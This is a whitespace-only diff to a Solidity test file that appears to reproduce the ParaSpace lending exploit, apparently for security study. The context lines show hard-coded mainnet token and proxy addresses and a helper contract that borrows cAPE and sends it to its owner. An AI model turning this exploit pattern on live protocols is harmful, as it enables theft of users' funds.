@@ -14,16 +14,21 @@ import "./../interface.sol";
 // code: https://github.com/para-space/paraspace-core/pull/368/files
 
 interface IParaProxy {
+
     function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
 
     function borrow(address asset, uint256 amount, uint16 referralCode, address onBehalfOf) external;
+
 }
 
 interface IAPEStaking {
+
     function depositApeCoin(uint256 _amount, address _recipient) external;
+
 }
 
 contract ContractTest is Test {
+
     IERC20 wstETH = IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
     IERC20 cAPE = IERC20(0xC5c9fB6223A989208Df27dCEE33fC59ff5c26fFF);
     IERC20 APE = IERC20(0x4d224452801ACEd8B2F0aebE155379bb5D594381);
@@ -156,9 +161,11 @@ contract ContractTest is Test {
         });
         Router.exactOutputSingle(_Param2);
     }
+
 }
 
 contract Slave {
+
     IERC20 wstETH = IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
     IERC20 cAPE = IERC20(0xC5c9fB6223A989208Df27dCEE33fC59ff5c26fFF);
     IParaProxy ParaProxy = IParaProxy(0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee);
@@ -174,4 +181,5 @@ contract Slave {
         ParaProxy.borrow(address(cAPE), _amountOfShares, 0, address(this));
         cAPE.transfer(owner, cAPE.balanceOf(address(this)));
     }
+
 }
